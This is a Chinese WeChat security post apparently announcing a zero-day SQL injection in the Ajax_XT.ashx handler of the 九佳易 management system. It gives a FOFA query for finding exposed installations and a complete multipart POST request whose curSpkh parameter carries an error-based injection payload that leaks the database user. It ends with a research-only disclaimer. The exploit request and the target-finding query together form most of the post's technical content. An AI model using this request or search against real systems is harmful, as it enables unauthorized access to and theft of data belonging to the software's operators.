---
title: 【0day】九佳易管理系统 Ajax_XT.ashx SQL 注入漏洞
url: https://mp.weixin.qq.com/s/Y67DqZSpC02wuksXdckDFA
source: Doonsec's feed
date: 2026-02-28
fetch_date: 2026-03-01T04:19:57.589937
---

# 【0day】九佳易管理系统 Ajax_XT.ashx SQL 注入漏洞

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ZrTsB3aQgWAMcOkM66aEvgute5bmficUyEXMG1MWoZic1oSlD1Dzql8w5GMCUgDQVB3Eg3LjtyXdRlNhgYic7fGFEFJ0FnoQM6xped6CTqYBGY/0?wx_fmt=jpeg)

# 【0day】九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞

0day收割机

![]()

在小说阅读器中沉浸阅读

# 漏洞简介

九佳易管理系统中的 Ajax\_XT.ashx 通用处理程序接口存在SQL注入漏洞，该接口主要用于处理前端 AJAX 请求并与后端数据库进行交互。由于接口未对客户端传入的关键参数进行严格的输入校验、参数化处理或特殊字符转义，攻击者可通过构造恶意的 SQL 语句片段注入到请求参数中，使后端数据库执行非授权的 SQL 操作，进而窃取、篡改甚至销毁数据库中的敏感数据。

# 影响版本

# fofa语法

> title="VSQL" && body="/Scripts/Login\_A8/"

# 漏洞复现

> 因为参数获取是通过`this.Request["hyh"]`的方式，因此支持get、post等常规方式外，还支持multipart格式

```
POST /Service/Ajax_XT.ashx HTTP/1.1
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="curFlag"

PicSord
------WebKitFormBoundary
Content-Disposition: form-data; name="curPxbh"

1,2
------WebKitFormBoundary
Content-Disposition: form-data; name="curSpkh"

'-1/user--
------WebKitFormBoundary--
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZrTsB3aQgWCzFzxRNP5YhXuH4qC6CqtIUGuibjKc8MMvNwJJiblljwB5pOibibJJxggygH1g8akcSzf8G4Qskn7Oe5ibwTfguj3T3gO9YXpD2iaPg/640?wx_fmt=png&from=appmsg)

成功利用报错注入在响应回显当前数据库用户信息。

仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/MtjOicQLUtFg3CRl5wFA4loxN8krcYMpuzNjcVibkricNCB4GC9k3ib6UQLsf2RIuOcJFHT568lSjAqz8ze0oMAgxw/0?wx_fmt=png)

0day收割机

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/MtjOicQLUtFg3CRl5wFA4loxN8krcYMpuzNjcVibkricNCB4GC9k3ib6UQLsf2RIuOcJFHT568lSjAqz8ze0oMAgxw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过